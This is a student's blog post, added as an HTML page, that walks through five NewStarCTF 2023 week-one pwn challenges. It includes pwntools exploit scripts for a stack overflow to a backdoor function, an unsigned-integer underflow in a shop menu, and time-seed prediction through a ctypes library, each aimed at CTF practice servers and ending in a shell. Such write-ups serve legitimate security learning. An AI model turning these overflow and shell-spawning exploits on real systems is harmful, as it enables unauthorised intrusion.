@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>2023 newstarctf新生赛 week1 pwn | BW-jitang</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://jitang-BW.github.io/favicon.ico?v=1698753168785">
+<link rel="stylesheet" href="https://jitang-BW.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="ret2text
+由hint知道这是一道栈溢出题目
+checksec一下，64位小端
+
+拖到ida查看，果然是栈溢出问题
+找到后门函数地址，由ida反编译知道read函数读取的buf长度为0x20，而读取0x30个字节，典型的栈溢出问题
+构..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://jitang-BW.github.io">
+        <img src="https://jitang-BW.github.io/images/avatar.png?v=1698753168785" class="site-logo">
+        <h1 class="site-title">BW-jitang</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jitang-BW.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">2023 newstarctf新生赛 week1 pwn</h2>
+            <div class="post-date">2023-10-08</div>
+            
+              <div class="feature-container" style="background-image: url('https://jitang-BW.github.io/post-images/ZIZN_yt8a.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="ret2text">ret2text</h1>
+<p>由hint知道这是一道栈溢出题目<br>
+checksec一下，64位小端<br>
+<img src="https://jitang-BW.github.io/post-images/1696741925253.png" alt="" loading="lazy"><br>
+拖到ida查看，果然是栈溢出问题<br>
+找到后门函数地址，由ida反编译知道read函数读取的buf长度为0x20，而读取0x30个字节，典型的栈溢出问题<br>
+构造exp</p>
+<pre><code>from pwn import *
+ 
+p = remote('node4.buuoj.cn',26646)
+
+context (os='linux',arch='amd64')
+
+flag = 0X4011FB
+
+payload = b'a'*(0x28) + p64(flag)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>ls一下，确实拿到权限，直接cat flag<br>
+<img src="https://jitang-BW.github.io/post-images/1696742129662.png" alt="" loading="lazy"></p>
+<h1 id="ezshellcode">ezshellcode</h1>
+<p>由hint知道是shellcode类型<br>
+同样的checksec手法知道是64位小端<br>
+ida内只有read函数，直接用pwntools生成shellcode注入即可<br>
+ps:原来存代码的虚拟机炸了，不过存了exp图片。。。。。</p>
+<figure data-type="image" tabindex="1"><img src="https://jitang-BW.github.io/post-images/1696742563087.png" alt="" loading="lazy"></figure>
+<p>直接交互，拿到shell</p>
+<figure data-type="image" tabindex="2"><img src="https://jitang-BW.github.io/post-images/1696742685471.png" alt="" loading="lazy"></figure>
+<h1 id="newstar-shop">newstar shop</h1>
+<p>先说这道题思路</p>
+<p>目的是买入shell，但是很贵，100买不起，选择输入2挣钱也不够，不过数据给出unsigned，那么就可以考虑整数溢出，花费超过100时变成负数，同样也是很大的数，这时候就可以买得起shell</p>
+<p>由于买1和2都有保护机制，所以要先买1和2，选择3时直接扣除50而没有保护，要去买东西让钱数少于50，再去选择3，1和2都能买一次，恰巧剩余40小于50，然后选3变成负数，这是就能买shell</p>
+<pre><code>from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+p = remote('node4.buuoj.cn', 29606)
+p.recv()
+p.sendline(b'1')
+p.recv()
+p.sendline(b'2')	
+p.recv()
+p.sendline(b'1')
+p.recv()
+p.sendline(b'1')
+p.recv()
+p.sendline(b'3')
+p.recv()
+p.sendline(b'1')
+p.recv()
+p.sendline(b'3')
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://jitang-BW.github.io/post-images/1696744041314.png" alt="" loading="lazy"></figure>
+<h1 id="p1eee">p1eee</h1>
+<p>根据hint是一道pie保护题，基地址无法确定<br>
+根据ida，发现溢出在sub_120E中，溢出最多1字节，找到/bin/sh在sub_120E不远处，在一页的地址都是按顺序的，只要改地址后两位为调用system的地址后两位'6C'即可</p>
+<figure data-type="image" tabindex="4"><img src="https://jitang-BW.github.io/post-images/1696744949103.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://jitang-BW.github.io/post-images/1696744967888.png" alt="" loading="lazy"></figure>
+<h1 id="random">Random</h1>
+<p>Random这道题照扒的官方WP<br>
+考察的ctypes库的调用<br>
+还需要多做这种题巩固</p>
+<p>需要一个c语言函数来生成一个伪随机数来绕过第一道判断</p>
+<pre><code>from pwn import *
+import ctypes
+tob=lambda text: str(text).encode('utf-8')
+lib = ctypes.CDLL('./random1.so')
+while 1:
+	try:
+		sh = remote(&quot;node4.buuoj.cn&quot;, 27477)
+		lib.random_number.restype = ctypes.c_int
+		lib.set_seed()
+		result = lib.random_number()
+		log.success(&quot;result==&quot; + hex(result))
+		sh.recvuntil(b&quot;?\n&quot;)
+		sh.sendline(tob(result))
+		sh.sendline(b'ls')
+		answer = sh.recv(timeout = 3)
+		
+		if b'sh' in answer:
+			sh.close()
+		elif b'Haha you are wrong' in answer:
+			sh.close()
+		else:
+			sh.interactive()
+	except:
+		sh.close()
+
+</code></pre>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+void set_seed() { 
+time_t seed = time(NULL); 
+srand(seed);
+}
+int random_number() { 
+return rand();
+}
+</code></pre>
+<p>编译c语言程序作为一个动态链接库(.so文件)</p>
+<pre><code>gcc -shared -o random1.so random1.c
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://jitang-BW.github.io/post-images/1696747556205.png" alt="" loading="lazy"></figure>
+<p>补充：主要难点就是编写随机数程序和建立链接库，以及不同情况的再处理</p>
+<h2 id="总结">总结</h2>
+<p>作为一个新生，是newstar这个新生赛带着我逐渐认识pwn。这周的题目主要是简单的栈溢出以及没见过的动态链接库，计划多刷buu和nss平台的题，还要有类似于random题目的补强。<br>
+从认识elf文件，到配置环境，再到简单的栈溢出。有几位学长一直引领我前行，在此感谢各位学长的付出，虽热现在是菜中更有菜中手，但是我会努力在pwn的路上越走越远，不断强于昨天的自己。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://jitang-BW.github.io/post/elf-wen-jian/">
+                  <h3 class="post-title">
+                    ELF文件
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
